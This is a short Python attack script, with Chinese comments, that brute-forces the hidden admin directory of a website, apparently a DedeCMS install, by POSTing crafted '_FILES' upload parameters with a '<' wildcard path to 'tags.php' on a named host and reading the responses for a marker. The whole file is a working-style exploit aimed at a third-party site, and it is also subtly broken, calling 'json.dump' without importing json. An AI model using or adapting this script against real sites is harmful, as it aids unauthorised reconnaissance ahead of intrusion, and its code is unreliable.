#coding:utf-8

import requests
import sys


website = "http://wbccfo.com/tags.php"  # 主页
feature_true = "TAG"  # 返回成功的页面所应含的内容
feature_false = "Upload"    # 返回错误页面所含内容

headers = {'User-Agent': 'Mozilla/5.0 Chrome/28.0.1500.63', }
payloads = list('abcdefghijklmnopqrstuvwxyz0123456789@_.')  # 用来测试的字符，可以自行添加

for value1 in payloads:
    for value2 in payloads:
        key = value1 + value2
        payload = r"dopost=save&_FILES[b4dboy][tmp_name]=./{0}</images/admin_top_logo.gif&_FILES[b4dboy][name]=0&_FILES[b4dboy][size]=0&_FILES[b4dboy][type]=image/gif".format(key)
        r = requests.post(url=website, headers=headers, data=json.dump(payload))  # url
        if  feature_true in r.text:
            print(r.text)
            print("【found!】 : " + key)
            sys.exit()
        elif feature_false in r.text:
            print("testing : " + key)
        else:
            print("no match.")